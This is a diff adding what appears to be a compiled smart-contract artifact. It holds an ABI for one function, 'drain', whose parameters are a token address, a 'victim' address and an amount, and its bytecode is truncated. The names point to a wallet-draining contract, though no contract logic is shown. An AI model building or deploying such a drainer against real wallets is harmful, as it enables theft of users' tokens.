@@ -1,0 +1,17 @@
+{
+    "abi": [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "tokenAddress", "type": "address" },
+          { "internalType": "address", "name": "victim", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "drain",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ],
+    "bytecode": "0x60806040..."
+  }
+  
